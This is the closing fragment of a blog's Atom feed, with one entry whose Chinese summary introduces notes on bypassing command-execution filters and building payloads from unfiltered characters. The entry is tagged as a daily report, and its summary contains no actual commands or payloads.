    <summary type="html">&lt;h4 id=&quot;命令执行&quot;&gt;&lt;a href=&quot;#命令执行&quot; class=&quot;headerlink&quot; title=&quot;命令执行&quot;&gt;&lt;/a&gt;命令执行&lt;/h4&gt;&lt;p&gt;首先看过滤了什么东西，再按照下面的方法一点一点绕过。&lt;br&gt;再利用没过滤的字符构造playload&lt;br&gt;很多是可以泛用的，</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
</feed>
